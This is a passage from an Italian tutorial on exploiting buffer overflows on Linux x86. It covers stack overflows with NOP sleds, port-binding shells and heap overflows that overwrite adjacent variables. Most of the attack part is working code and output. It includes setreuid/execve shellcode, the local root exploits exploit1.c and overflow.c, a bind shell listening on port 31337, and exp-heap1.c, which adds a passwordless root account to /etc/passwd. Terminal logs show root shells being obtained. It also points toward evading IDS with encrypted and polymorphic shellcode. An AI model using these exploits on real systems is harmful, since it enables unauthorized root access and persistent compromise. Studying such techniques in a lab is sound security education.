+        while(fgets(line, sizeof(line), fp))
+        {
+                shellparse(line);
+        }
+        printf(" \"\";                           /*   end of shellcode - shgen by andreas n. */\n");
+ 
+        printf("\nint main(void)\n");
+        printf("{\n");
+        printf("\t\t((void (*)(void)) shellcode)();\n");
+        printf("\t\treturn 0;\n");
+        printf("}\n");
+ 
+        pclose(fp);
+ }
+ 
+ void header(void)
+ {
+        puts("######################################");
+        puts("#  Shellcode Generator by andreas n. #");
+        puts("#  --------------------------------- #");
+        puts("#        v1.0  - License: GPL        #");
+        puts("######################################");
+        printf("\n");
+ 
+ }
+ 
+
+
+ int main(int argc, char **argv)
+ {
+        FILE *test;
+        if(argc != 2)
+        {
+                printf("Usage %s <file>\n", argv[0]);
+                exit(1);
+        }
+        if( (test = fopen(argv[1], "r")) == NULL)
+        {
+                printf("Error: File %s not found\n", argv[1]);
+                exit(0);
+        }
+ 
+        header();
+        shellgen(argv[1]);
+        exit(0);
+ }
+
+
+[===-0x04d Possibili approfondimenti (a carico vostro)-===================]
+
+ L'unico approfondimento che tengo ad introdurvi riguarda i sistemi di anti-IDS.
+ un IDS (Intrusion Detection System) si occupa anche di analizzare l'effettivo
+ comportamento di uno shellcode in base a delle signature, che possono andare
+ dai nod (nop padding o nop sledding, vedremo in seguito), all'esempio classico
+ di "/bin/sh".
+ Il metodo più semplice e più comune, è quello di criptare lo shellcode servendosi
+ di un semplicissimo xor, ma non voglio andare avanti e diventare dispersivo, vi 
+ consiglio dunque letture sui "polymorphic shellcode" o "shellcode polimorfici"..
+ Detto questo, io continuo per la mia strada entrando nel quinto capitolo.
+
+
+[===-0x05 Get the box!-===================================================]
+
+ A questo punto del testo siamo pronti ad affrontare l'exploiting dello stack 
+ buffer overflow, ogni paragrafo del capitolo è stata scritta al fine di permettere
+ un'ottima comprensione della struttura dell'exploit locale e remoto, listato 
+ ai punti 5.3 e 5.5, siete dunque tenuti a leggere con attenzione quanto scritto
+ sino al codice finale =)
+
+
+[===-0x05a Shellcode injection-===========================================]
+
+ Come visto in precedenza nel capitolo 3, provocando un overflow volontario ci è 
+ possibile sovrascrivere l'indirizzo di ritorno da una funzione, di modo che 
+ all'uscita da quest'ultima il programma si ritrovi a continuare l'esecuzione del
+ listato da una posizione "non prevista"..
+ Per sfruttare a nostro vantaggio questa possibilità, ci basta unire ciò che si è
+ imparato nel capitolo 3 con le tecniche di shellcoding descritte nel capitolo 4.
+
+ Programma vulnerabile d'esempio (capitolo 3):
+
+ #include <stdio.h>
+ #include <string.h>
+
+ int main(int argc, char *argv[]) { 
+	char s2[20];
+
+	if(argv[1]) {
+		strcpy(s2,argv[1]);
+		printf("%s\n",s2);
+	}
+	return 0;
+ }
+
+ Compiliamo: gcc v00ln.c -o v00ln
+
+ Seguendo quindi quanto spiegato al paragrafo 3.2 si arriva ad ottenere quanti bytes
+ sono necessari (nel nostro caso e sulla nostra box) per mandare in overflow
+ il programma e sovrascrivere EIP..
+
+ (gdb) r `perl -e 'print "A" x 128'`
+ Starting program: /root/v00ln `perl -e 'print "A" x 128'`
+
+ Program received signal SIGSEGV, Segmentation fault.
+ 0x41414141 in ?? ()
+ (gdb) i r
+ eax            0x0      0
+ ecx            0x0      0
+ edx            0x81     129
+ ebx            0x4015bff0       1075167216
+ esp            0xbffff510       0xbffff510
+ ebp            0x41414141       0x41414141
+ esi            0xbffff560       -1073744544
+ edi            0x2      2
+ eip            0x41414141       0x41414141
+ eflags         0x210282 2163330
+ cs             0x23     35
+ ss             0x2b     43
+ ds             0x2b     43
+ es             0x2b     43
+ fs             0x0      0
+ gs             0x0      0
+
+ Sono esattamente 128.
+ Capire come bisogna comportarsi per proseguire nell'exploiting è semplice.
+ La memoria durante l'overflow con overwrite di EIP è così composta:
+
+ [<------buffer------>][<-EBP->][<-EIP->]
+      (120 bytes)      (4 bytes)(4 bytes)
+
+ quello che vogliamo fare consiste nel posizionare lo shellcode in un'area di memoria
+ della quale si conosce l'indirizzo e far puntare EIP a quest'ultimo di modo che
+ il programma, all'uscita dalla funzione, non si ritrovi a violare la segmentazione
+ di memoria ma bensì ad eseguire il nostro shellcode..
+ E' più semplice in pratica che in teoria, basterà infatti inserire all'inizio di 
+ buffer il nostro shellcode e riempire i restanti bytes con la locazione di memoria
+ dove è situato l'inizio della variabile dove abbiamo inserito lo shellcode..
+
+ Come prima cosa dobbiamo conoscere l'indirizzo in memoria della variabile s2 
+ nel nostro programma, per fare ciò dobbiamo andare a tentativi, inizieremo 
+ dallo stack pointer e proseguiremo allontanandoci progressivamente, programmeremo
+ dunque uno strumento che ci permetterà di creare il primo argomento (ideato poche 
+ righe sopra) da passare al programma vulnerabile, cambiando ogni volta l'offset 
+ in questione (la distanza tra la locazione di memoria dove è situato s2 ed ESP), 
+ a questo punto dovrà eseguire il programma vulnerabile con la stringa creata 
+ e fermarsi (per obbligo) quando l'indirizzo generato è quello esatto, portando 
+ il programma vulnerabile ad eseguire lo shellcode...
+
+ /* exploit1.c - primo esempio di exploit locale
+  * www.eviltime.com */
+
+ #include <unistd.h>
+ #include <stdio.h>
+ #include <stdlib.h>
+
+ #define BUFFER_SIZE 200 // in teoria è 128 ma andiamo sul sicuro :)
+
+ /* setreuid(0,0) x86 shellcode */ 
+  char *shellcode = 
+	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd"
+	"\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+	"\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54"
+	"\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b"
+	"\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
+
+ int get_sp(void) {
+ 	__asm__("movl %esp, %eax"); // copio l'indirizzo dello stack pointer in eax
+                                  // l'indirizzo del nostro shellcode non sarà molto lontano
+                                  // da lì..
+ } 
+ 
+ int main(int argc, char **argv) {
+ 	int i, offset;
+ 	long ret_addr, *addr;
+ 	char buffer[BUFFER_SIZE], *ptr;
+
+ 	if(argc<2) exit(0);
+ 
+ 	offset = atoi(argv[1]);             // salviamo l'offset
+ 	ret_addr = get_sp()+offset;         // recuperiamo l'indirizzo di ritorno ESP+OFFSET
+ 	printf("utilizzo l'indirizzo: 0x%x\n", ret_addr);
+
+	ptr = buffer;
+	addr = (long *)ptr;
+
+	/* riempo buffer con l'indirizzo di ritorno appena ricavato */
+ 	for(i=0; i<BUFFER_SIZE-1;i+=4) *(addr++) = ret_addr; 
+
+	/* riempo la prima parte di buffer con lo shellcode */
+ 	for(i=0; i<strlen(shellcode);i++) buffer[i]=shellcode[i]; 
+ 
+	/* inserisco un null byte per indicare la fine della stringa */
+	buffer[BUFFER_SIZE-1] = '\0';
+
+	/* eseguo il programma */
+	execl("v00ln", "v00ln", buffer, NULL);
+	return 0; 
+ }
+ 
+ Sul codice, già abbastanza commentato, non dovrebbero esserci problemi.
+ Rendiamo SUID il programma vulnerabile (v00ln) con chmod +s v00ln e
+ andiamo per tentativi.. 
+
+ evil@eviltime:/home/evil$ ./exploit1 10
+ offset: 10
+ utilizzo l'indirizzo: 0xbffff552
+ evil@eviltime:/home/evil$ ./exploit1 11
+ offset: 11
+ utilizzo l'indirizzo: 0xbffff553
+
+ Per evitare inutili perdite di tempo possiamo creare un ciclo in bash e 
+ lanciarlo dalla linea di comando:
+
+ evil@eviltime:/home/evil$ for((i=0;i<2000;i++)) do echo "offset: $i"; ./exploit1 $i; done 
+ [...]
+ offset: 11
+ utilizzo l'indirizzo: 0xbffff553
+ offset: 12
+ utilizzo l'indirizzo: 0xbffff554
+ [...]
+ offset: 486
+ utilizzo l'indirizzo: 0xbffff72e
+ Segmentation fault
+ offset: 487
+ utilizzo l'indirizzo: 0xbffff72f
+ Segmentation fault
+ offset: 488
+ utilizzo l'indirizzo: 0xbffff730
+ sh-3.1# id
+ uid=0(root) gid=0(root) groups=0(root)
+ sh-3.1#  
+
+ Dopo svariati tentativi lo script passa per l'offset esatto, e il programma vulnerabile
+ viene dirottato alla locazione di memoria contenente il nostro shellcode, il risultato
+ è dunque una shell con privilegi root.
+
+ Voglio ricordarvi che l'indirizzo di ritorno (return address) trovato sulla mia linuxbox
+ non funzionerà ne su altre distribuzioni, ne sullo stesso programma compilato 
+ con una versione di gcc diversa, siete quindi tenuti a ripetere sul vostro sistema 
+ le stesse operazioni descritte in questo testo, al fine di ottenere un exploit 
+ perfettamente funzionante.
+
+
+[===-0x05b L'uso dei NOPs (Sled)-=========================================]
+
+ L'istruzione NOP  (dall'inglese No Operation), in assembler si occupa di 
+ non svolgere alcuna operazione.
+ Ovviamente, come ogni comando, necessita di essere eseguito dal processore,
+ dunque occupa sia tempo (3 cicli di clock) che memoria (1 byte)..
+
+ Nonostante l'apparente "inutilità" dell'istruzione NOP, applicata invece
+ al nostro exploit diventa una comodità assoluta. Riempiendo di NOP uno
+ spazio X prima del nostro shellcode, e facendo ritornare la funzione
+ in un punto a caso della memoria dove c'è uno dei nostri NOP, il 
+ processore eseguirà ogni istruzione da quel punto, sino ad arrivare al 
+ nostro shellcode, ci sarà dunque dato in aiuto un margine di errore, 
+ cosa che prima non potevamo permetterci. Questa operazione viene chiamata
+ NOP Sled (o NOD).
+
+
+  NOP Sled (100b) | Shellcode (60b) | Ret addr (40b)
+ [------------------buffer (200b)------------------]
+
+ Nel codice dell'exploit cambierà poco (lo vedremo nel prossimo paragrafo),
+ ma c'è anche da far notare che diventerà come un faro nel buio per i 
+ sistemi IDS, che riconosceranno al volo il nostro NOP Sled.
+
+
+[===-0x05c Local root exploit (overflow.c)-===============================]
+
+ In questo exploit "finale" uniremo tutti gli accorgimenti e le correzioni
+ viste nei paragrafi seguenti al primo esempio:
+
+ /* overflow.c - local root exploit, v00ln.c proof of concept
+  * www.eviltime.com */
+
+ #include <unistd.h>
+ #include <stdio.h>
+ #include <stdlib.h>
+
+ #define BUFFER_SIZE 200
+ #define NOP 0x90           // 0x90 è l'opcode dell'istruzione NOP
+ #define RETADDR 0xbffff73c
+
+ /* setreuid(0,0) x86 shellcode */ 
+  char *shellcode = 
+	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd"
+	"\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+	"\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54"
+	"\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b"
+	"\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
+
+ int get_sp(void) {
+ 	__asm__("movl %esp, %eax"); // copio l'indirizzo dello stack pointer in eax
+                                  // l'indirizzo del nostro shellcode non sarà molto lontano
+                                  // da lì..
+ } 
+ 
+ int main(int argc, char **argv) {
+ 	int i, offset;
+ 	long ret_addr, *addr;
+ 	char buffer[BUFFER_SIZE], *ptr;
+ 
+ 	printf("utilizzo l'indirizzo: 0x%x\n", RETADDR);
+
+	ptr = buffer;
+	addr = (long *)ptr;
+
+ 	for(i=0; i<BUFFER_SIZE-1; i+=4) *(addr++) = RETADDR; // riempo buffer con l'indirizzo di ritorno
+        for(i=0; i<60; i++) *(buffer + i) = NOP;             // occupo i primi 60 byte con un NOP Sled
+	memcpy(buffer+60, shellcode, strlen(shellcode));     // inserisco lo shellcode dopo lo Sled
+
+	/* inserisco un null byte per indicare la fine della stringa */
+	buffer[BUFFER_SIZE-1] = '\0';
+
+	/* eseguo il programma */
+	execl("v00ln", "v00ln", buffer, NULL);
+	return 0; 
+ }
+
+
+L'exploit è finito, ed è perfettamente funzionante. 
+Il return address scelto "0xbffff73c", è una convenzione, dopo essermi accertato
+che i NOP sono tra un offset che varia da 489 a 549 byte dallo stack, ho
+scelto un return address nel mezzo di questo range..
+
+
+[===-0x05d Analisi di un attacco remoto-==================================]
+
+Il problema principale durante la ricerca di un bug da sfruttare da remoto,
+dunque nella malgestione di pacchetti in entrata da parte di un programma
+che offre un servizio alla rete esterna, è il fatto che non possiamo permetterci
+errori, basterebbe infatti sbagliare il solo indirizzo di ritorno per
+crashare il servizio sulla macchina attaccata, dire addio ad una potenziale
+shell remota, e lasciare i nostri tentativi di attacco dentro i log di
+sistema della stessa.
+
+Per evitare questo scenario "apocalitico", ci occorre fare i test di 
+exploiting in un sistema casalingo creato ad hoc per l'occasione, ci 
+servirà dunque venire a conoscenza delle caratteristiche del sistema vittima
+
+ - Architettura CPU
+ - Sistema Operativo
+ - Eventuali IDS
+ - Programma di servizio che si vuole analizzare
+
+Per ottenere queste informazioni possiamo affidarci alle innumerevoli
+tecniche di fingerprinting, uno dei programmi che si possono utilizzare
+è nmap, scaricabile da www.insecure.org
+Per ottenere invece il nome del programma e la relativa versione utilizzati
+per gestire il servizio che si vuole attaccare si passa al "banner grabbing".
+
+Fatto questo, la programmazione dell'exploit remoto è uguale per quella 
+locale, con l'unica differenza che la stringa costruita và successivamente
+inviata via l'uso di socket (vedi: socket()), e il nostro shellcode necessita
+di alcuni accorgimenti per mettere l'interprete dei comandi in ascolto
+su una determinata porta, si parla dunque di Port-Binding shellcode,
+un esempio molto banale in C potrebbe essere il seguente:
+
+int main()
+{
+        char *shell[2];
+        int fd,fd2,fromlen;      // 
+        struct sockaddr_in serv; // definizione struttura del socket
+
+        fd=socket(AF_INET,SOCK_STREAM,0); // inizializzazione socket
+        serv.sin_addr.s_addr=0;  // source address
+        serv.sin_port=31337;     // porta
+        serv.sin_family=AF_INET; // TCP
+        bind(fd,(struct sockaddr *)&serv,16); // binding
+        listen(fd,1); // aspetta per una connessione
+        fromlen=16;   // lunghezza (struct sockaddr *)
+        fd2=accept(fd,(struct sockaddr *)&serv,&fromlen); // accetta la connessione
+        /* ora connettiamo stdin/out/err al socket */
+        dup2(fd2,0);  // apre stdin 
+        dup2(fd2,1);  // apre stdout 
+        dup2(fd2,2);  // apre stderr
+        shell[0]="/bin/sh";
+        shell[1]=NULL;
+        execve(shell[0],shell,NULL); // eseguiamo la shell /bin/sh
+}
+
+
+[===-0x10 Preparazione all'argomento (heap-based overflows)-==============]
+
+ In questa parte del testo si parla dei problemi di sicurezza riguardanti
+ un'altro segmento della memoria di un processo, il segmento HEAP, quell'area
+ di memoria che contiene i dati allocati dinamicamente..
+
+
+[===-0x10a Organizzazione della memoria di un processo (approfondimento)-=]
+
+ Si è già parlato inizialmente della segmentazione della memoria 
+ di un processo, queste basi apprese in precedenza non bastano però 
+ per comprendere al meglio gli HEAP overflow, vediamo dunque di approfondirli
+ e magari di fare anche un leggero ripasso:
+
+ TEXT	(text segment)
+	Codice eseguibile
+
+ DATA	(data segment)
+	Area contenente le variabili dichiarate come statiche
+	o globali "inizializzate"
+
+ BSS	(data segment)
+	Area posizionata all'interno del segmento DATA contenente 
+	tutte le variabili statiche o globali NON inizializzate
+
+ HEAP	(data segment)
+	Area contenente la memoria allocata dinamicamente
+
+ Stack	(stack segment)
+	Segmento contenente variabili locali (non static) allocate 
+	automaticamente
+
+
+[===-0x10b HEAP-==========================================================]
+
+ l'heap segment è inizialmente un area di memoria inutilizzata, in prima
+ cosa differisce dallo stack poichè cresce verso il basso, è di dimensioni
+ sensibilmente più grandi e gode di un sistema di allocazione della memoria
+ 'dinamico', è possibile infatti allocare spazio a variabili durante l'esecuzione
+ del programma (runtime) e successivamente liberare lo spazio in questione
+ quando più viene comodo al programmatore.
+
+ Importante ricordare che lo spazio allocato non viene liberato automaticamente
+ all'uscita dalla funzione (come accade nello stack), và dunque liberato arbitrariamente
+ prima della chiusura del processo con apposite funzioni (es. free()), onde evitare
+ che rimangano spazi di memoria RAM occupati inutilmente.
+
+ Utilizzare la memoria HEAP piuttosto che stack, si rivela molto utile
+ ad esempio quando ci troviamo a dover riempire un array del quale non 
+ conosciamo a priori l'esatta dimensione..
+
+[===-0x10c ELF-===========================================================]
+
+
+ Acronimo di Executable and Linkable Format è un formato standard per eseguibili
+ adottato da molti sistemi operativi basati su Unix,
+ Questo formato implica la suddivisione dell'eseguibile in varie sezioni ben
+ distinte per riuscire ad ottenere un esecuzione o un linking preciso e pulito.
+
+ Quello che vedremo di seguito non è altro che una timida introduzione, per studiare
+ l'argomento in modo più approfondito esiste la guida di riferimento (106 pagine)
+ raggiungibile da qui:
+
+ Un ELF appare strutturato in questo modo:
+
+ [ELF Header] contenente le informazioni per la lettura corretta del file
+ [Program Header Table] contenente le informazioni per ricostruire 
+			la corretta segmentazione della memoria
+ [Sections] 	varie sezioni di memoria riservate ad un certo compito,
+		tra le più importanti troviamo:
+
+		PLT (Procedure Linking Table)
+		GOT (Global Offset Table)
+		init
+		fini
+		ctors
+		dtors
+
+		Sezioni che ovviamente verranno trattate non appena se ne presenta
+		la reale necessità all'interno del testo.. (vedere Indice)
+
+ [Section Header Table]	tabella di riferimento per identificare le sezioni
+			all'interno dell'ELF
+
+
+[===-0x11 Heap Overflows-=================================================]
+
+
+ Diversamente da quello che accade durante uno stack overflow, nell'heap non cè
+ sovrascrizione di registri, ma bensì sovrascrizione di aree di memoria adiacenti,
+ è dunque possibile causare la sovrascrizione di contenenti di variabili globali 
+ o static all'interno del programma..
+
+ L'allocazione dinamica di memoria nel C avviene con l'uso delle funzioni *alloc()
+ tra cui le più importanti, malloc() e calloc():
+
+	void *malloc(size_t size);
+	void *calloc(size_t nmemb, size_t size);
+
+ la funzione malloc() riserva 'size' byte di spazio ad una certa variabile e ritorna
+ un puntatore alla memoria allocata.. se volessimo una char di 20 byte basterà
+ assegnare alla char il valore di ritorno di malloc(20); 
+
+	char *nome;		// dichiarazione
+	nome = malloc(20);	// allocazione
+
+ la stessa cosa vale per calloc() che però consente di allocare memoria per un array
+ di 'nmemb' elementi di 'size' byte ognuno..
+
+ ogni qual volta si voglia liberare lo spazio allocato, (onde evitare memory leaks)
+ si ricorre all'uso di free(); specificando la variabile come argomento:
+
+	free(nome); // per il caso precedente
+
+ L'idea dell'overflow sta nello sfruttare mancati controlli di lunghezza nel passaggio
+ di dati controllabili direttamente dall'utente, per sovrascrivere il contenuto
+ di variabili allocate successivamente a quella sulla quale si ha l'effettivo controllo..
+
+ Spieghiamoci meglio.. all'interno della funzione main abbiamo dichiarato queste
+ 2 variabili:
+
+	char *nome	= (char *)malloc(20);
+	char *nome2	= (char *)malloc(20);
+
+ e successivamente le variabili vengono riempite:
+
+	strcpy(nome2, "daniele");	// non controllata dall'utente
+	strcpy(nome, argv[1]);		// controllata dall'utente
+
+ è subito chiaro che manca un controllo sulla lunghezza dei dati passati dall'utente
+ per riempire la variabile "nome", se l'utente malizioso o semplicemente sbadato 
+ inserisse più di 20 byte per il nome, finirebbe per sovrascrivere il contenuto
+ della memoria adiacente, che è ben appunto nome2, dove non è previsto che l'utente
+ possa interagire..
+
+ Questa tecnica può essere anche utilizzata per dirottare il programma nell'eseguire
+ funzioni specifiche, diverse da quelle previste dal programmatore.. come ad esempio
+ shellcode o altre chiamate di sistema, ma questo lo vedremo poco più avanti..
+
+
+[===-0x11a Sovrascrizione di variabili-===================================]
+
+
+ Mettiamo di avere un programma che aggiunge, in un file,
+ una stringa passata dall'utente
+
+ #include <stdio.h>
+ #include <string.h>
+
+ #define FILENAME "/notes.tmp"
+
+ int main(int argc, char **argv) {
+	FILE *fd;				// file descriptor
+	char *string	= (char *)malloc(20);
+	char *outfile	= (char *)malloc(20);
+
+	if (argc<2) {
+		printf("bad usage\n");
+		exit(0);
+	}
+
+	/* riempiano la memoria allocata per le 2 variabili */
+	strcpy(outfile, FILENAME);
+	strcpy(string, argv[1]); // oops!
+
+	printf("* distanza tra string e outfile: %d\n", outfile - string);
+	printf("\tstringa: %s\n", string);
+	printf("\tfile: %s\n", outfile);
+	
+	if(!(fd = fopen(outfile, "a"))) {
+		printf("error opening %s\n", outfile);
+		exit(1);
+	}
+	fprintf(fd, "%s\n", string);
+	fclose(fd);
+	
+	return 0;
+ }
+
+ com'è possibile vedere in questo listato, il file dove il programma
+ andrà a scrivere non è personalizzabile dall'utente.
+ Vediamo dunque come si comporta il programma:
+
+ root@eviltime:/home/evil# chmod +s game
+ root@eviltime:/home/evil# su evil
+ evil@eviltime:~$ ./game prova
+ * distanza tra string e outfile: 24
+        stringa: prova
+        file: /notes.tmp
+ evil@eviltime:~$ cat /notes.tmp
+ prova
+
+ il programma funziona ed esce senza alcun errore..
+ ma come molti avranno notato, nel codice un errore c'è ed è anche
+ molto evidente, manca infatti un controllo sulla lunghezza della 
+ stringa passata in input (argv[1]). 
+ Possiamo dunque colmare i byte di distanza tra le 2 variabili
+ (come dice l'eseguibile sono 24), e sovrascrivere la variabile
+ adiacente a quella di nostro controllo, (in questo caso si tratta
+ del file dove andrà a scrivere il programma).. 
+
+ evil@eviltime:~$ ./game 123456789012345678901234TEST
+ * distanza tra string e outfile: 24
+         stringa: 123456789012345678901234TEST
+         file: TEST
+ evil@eviltime:~$ cat TEST
+ 123456789012345678901234TEST
+ evil@eviltime:~$
+
+ Perfetto, abbiamo ottenuto lo scenario appena descritto.
+ Un idea (visto che il programma è SUID) potrebbe 
+ essere quella di fargli inserire un nuovo record all'interno
+ di /etc/passwd , avremo così aggiunto al sistema un nuovo utente 
+ con permessi di root. Prima però vediamo di osservare cosa accade
+ più da vicino:
+
+ evil@eviltime:~$ gdb game
+
+ sttiamo un breakpoint sulla prima printf()
+
+ (gdb) b printf
+ Function "printf" not defined.
+ Make breakpoint pending on future shared library load? (y or [n]) y
+ Breakpoint 1 (printf) pending.
+
+ facciamo partire il programma
+
+ (gdb) r prova
+ Starting program: /home/evil/game prova
+ Breakpoint 1 at 0x4007a8b3
+ Pending breakpoint "printf" resolved
+
+ Breakpoint 1, 0x4007a8b3 in printf () from /lib/libc.so.6
+
+ disassembliamo il main() ed analizziamo i passaggi chiave
+ (se qualcosa non vi è chiaro date una ripassata alla parte
+ riguardante gli stack overflow)
+
+ (gdb) disas main
+ [...]
+ 0x08048513 <main+31>:   push   $0x14
+ 0x08048515 <main+33>:   call   0x80483a8 <malloc@plt>
+ 0x0804851a <main+38>:   add    $0x10,%esp
+ 0x0804851d <main+41>:   mov    %eax,0xfffffff8(%ebp)
+ 0x08048520 <main+44>:   sub    $0xc,%esp
+ 0x08048523 <main+47>:   push   $0x14
+ 0x08048525 <main+49>:   call   0x80483a8 <malloc@plt>
+ 0x0804852a <main+54>:   add    $0x10,%esp
+ 0x0804852d <main+57>:   mov    %eax,0xfffffff4(%ebp)
+ [...]
+
+ qui possiamo vedere l'allocazione dello spazio in memoria
+ per le 2 variabili, string e outfile, prima di ogni chiamata 
+ a malloc, viene pushata la dimensione in byte da allocare (20 bytes)
+
+ 0x14 = 20 in decimale
+
+ successivamente proseguendo nel listato troviamo
+ le chiamate a strcpy, ovvero il momento in cui il programma
+ copierà nella memoria allocata i rispettivi valori per le 2 variabili
+
+ [...]
+ 0x08048553 <main+95>:   push   $0x804872f
+ 0x08048558 <main+100>:  pushl  0xfffffff4(%ebp)
+ 0x0804855b <main+103>:  call   0x8048408 <strcpy@plt>
+ 0x08048560 <main+108>:  add    $0x10,%esp
+ 0x08048563 <main+111>:  sub    $0x8,%esp
+ 0x08048566 <main+114>:  mov    0xc(%ebp),%eax
+ 0x08048569 <main+117>:  add    $0x4,%eax
+ 0x0804856c <main+120>:  pushl  (%eax)
+ 0x0804856e <main+122>:  pushl  0xfffffff8(%ebp)
+ 0x08048571 <main+125>:  call   0x8048408 <strcpy@plt>
+ [...]
+
+ poco più avanti invece arriviamo alla parte più importante,
+ quella che potrà successivamente spiegarci come sia possibile
+ la sovrascrizione della seconda variabile..
+
+ 0x0804857c <main+136>:  mov    0xfffffff8(%ebp),%edx
+ 0x0804857f <main+139>:  mov    0xfffffff4(%ebp),%eax
+ 0x08048582 <main+142>:  sub    %edx,%eax
+ 0x08048584 <main+144>:  push   %eax
+ 0x08048585 <main+145>:  push   $0x804873c
+ 0x0804858a <main+150>:  call   0x80483c8 <printf@plt>
+
+ nelle prime due istruzioni vengono copiate le nostre stringhe
+ in %edx e %eax, subito dopo viene effettuata una sottrazione 
+ aritmetica tra gli indirizzi puntati dai 2 registri, il risultato
+ viene messo in %eax ed il tutto viene dunque passato alla printf().
+ vi ricorda qualcosa questa operazione?
+
+ 	printf("* distanza tra string e outfile: %d\n", outfile - string);
+
+ settando un breakpoint su questa printf() e analizzando il contenuto di edx 
+ (perchè %eax viene sovrascritto) sappiamo quindi con esattezza dove è
+ una delle 2 stringhe..
+
+ (gdb) b printf
+ Breakpoint 2 at 0x4007a8b3
+ (gdb) c
+ Continuing.
+ Breakpoint 1, 0x4007a8b3 in printf () from /lib/libc.so.6
+ (gdb) print $eax
+ $1 = 24
+
+ in eax è presente il risultato della sottrazione (24 bytes)
+
+ (gdb) x/s $edx
+ 0x8049908:       "prova"
+
+ e in edx abbiamo la stringa passata per argomento al programma..
+ se tutto torna alla posizione %edx+24 dovremo avere il nome del file,
+ proviamo:
+
+ (gdb) x/s $edx+24
+ 0x8049920:       "/notes.tmp"
+
+ vediamo ora cosa succede a queste 2 aree di memoria, se passiamo come 
+ argomento più di 24 byte, prendiamo d'esempio lo scenario proposto
+ prima, con la sovrascrizione del nome del file con TEST..
+ 
+ (gdb) b printf
+ Breakpoint 1 at 0x4007a8b3
+ (gdb) r 123456789012345678901234TEST
+ Starting program: /root/game 123456789012345678901234TEST
+ Error in re-setting breakpoint 1:
+ Function "printf" not defined.
+
+ Breakpoint 1, 0x4007a8b3 in printf () from /lib/libc.so.6
+ (gdb) x/s $edx
+ 0x8049908:       "123456789012345678901234TEST"
+ (gdb) x/s $edx+24
+ 0x8049920:       "TEST"
+
+ 
+ Analizzato al meglio lo scenario di overflow proposto in questo paragrafo
+ possiamo passare al coding di un exploit..
+ Ci sono alcune cose importanti da considerare, tra le quali troviamo la 
+ mancanza di un terminatore di stringa tra "string" e "filename", per cui
+ il nome del file verrà scritto assieme alla stringa all'interno
+ del file stesso, questo non ci è certamente d'aiuto nel caso in cui
+ il file sul quale vogliamo scrivere è /etc/passwd.
+ Ma un metodo intelligente lo possiamo trovare comunque:
+
+ Come dovreste sapere /etc/passwd contiene le informazioni degli utenti
+ presenti nel sistema, e per ogni utente vi è una stringa descrittiva
+ di pochi caratteri, questa stringa per l'utente root appare pressapoco così:
+
+	 root:x:0:0:root:/root:/bin/bash
+ 
+ il primo campo 'root' è il nome utente
+ la 'x' sta ad indicare che è richiesta una password, e questa password
+ è conservata all'interno di /etc/shadow (criptata).
+ i due '0' indicano rispettivamente User ID e Group ID, in unix
+ lo 0 indica i permessi di amministratore (root).
+ "/root" è la home directory dell'utente..
+ e infine "/bin/bash" è l'interprete (shell) da collegare al terminale dell'utente
+ per l'esecuzione dei comandi..
+
+ il nostro problema sta nel fatto che se volessimo aggiungere una stringa
+ come la seguente ad /etc/passwd:
+
+	r00t::0:0:r:/root:/bin/bash
+
+ ci ritroveremo invece questo:
+
+	r00t::0:0:r:/root:/bin/bash/etc/passwd
+
+ per risolvere a questo possiamo creare un link simbolico di /bin/bash
+ e chiamarlo con un nome più opportuno ad esempio /tmp/etc/passwd
+ creiamo dunque la directory etc in /tmp/
+
+ evil@eviltime:/tmp$ mkdir etc
+
+ quindi creiamo il collegamento
+
+ evil@eviltime:/tmp$ ln -s /bin/bash /tmp/etc/passwd
+
+ ora all'esecuzione di /tmp/etc/passwd avremo una shell..
+ l'ultimo problema si pone sulla lunghezza della stringa che non deve
+ assolutamente essere diversa da 24byte (altrimenti sorgerebbero ulteriori 
+ problemi sul nome del file)
+
+ La stringa "r00t::0:0:r:/root:/tmp" è infatti di 23 byte, aggiungiamo una lettera
+ al nome dell'utente e siamo a cavallo:
+
+ la stringa che andremo a passare all'eseguibile sarà quindi
+ r000t::0:0:r:/root:/tmp/etc/passwd
+
+ vediamo ora di scrivere un exploit funzionante che svolga per noi, tutti 
+ i passaggi descritti in precedenza (dalla creazione del symbolic link
+ all'aggiunta del nuovo utente root all'interno di /etc/passwd
+
+ 
+ /* exp-heap1.c - local heap-based overflow exploit for heap1.c
+  *
+  * adds a root-privileged user to /etc/passwd
+  * usage: ./exp-heap1 username
+  *
+  */
+
+ #include <stdio.h>
+ #include <string.h>
+ #include <unistd.h>
+ #include <errno.h>
+
+ #define OFFSET 24              // distanza tra le 2 variabili nel programma vulnerabile
+ #define VULNPROG "./vheap1"
+
+ int main(int argc, char **argv) {
+        char string[30] = "::0:0:r:/root:/tmp/etc/passwd\0";
+        char username[6];
+        char mainstring[36];
+        int calc;
+
+        if (argc<2) {
+                printf("error: usage: %s <user>\n", argv[0]);
+                exit(0);
+        }
+
+        calc = strlen(string)+strlen(argv[1])-11;
+        if(calc!=OFFSET) {
+                printf("%d per string e argv %d\n", strlen(string), strlen(argv[1]));
+                printf("error: string+user must be equal to OFFSET\nstring+user = %d\nOFFSET = %d\n",$
+                exit(0);
+        }
+
+        if(mkdir("/tmp/etc", 0777)!=0)
+		perror("cannot create /tmp/etc");
+        if(symlink("/bin/bash", "/tmp/etc/passwd")!=0)
+                perror("cannot create symbolic link");
+
+        strncpy(username, argv[1], 6);
+        sprintf(mainstring, "%s%s", username, string);
+
+        printf("* exploiting %s..\n", VULNPROG);
+        execl(VULNPROG, VULNPROG, mainstring, NULL);
+
+        printf("* done!\n");
+        return 0;
+ }
+
+ Proviamo ad eseguire l'exploit e osserviamo cosa succede:
+
+	evil@eviltime:~$ ./game xevilx
+	* exploiting ./vheap1..
+	* distanza tra string e outfile: 24
+        stringa: xevilx::0:0:r:/root:/tmp/etc/passwd
+        file: /etc/passwd
+
+ eseguito con successo, per controllare l'effettiva esistenza del nuovo account
+ proviamoci a loggare con lo username scelto:
+
+	evil@eviltime:~$ su xevilx
+	root@eviltime:/home/evil# id
+	uid=0(root) gid=0(root) groups=0(root)
+
+ come si può vedere una volta eseguito il comando non viene richiesta alcuna 
+ password e ci vengono assegnati i permessi di amministratore..
+
+
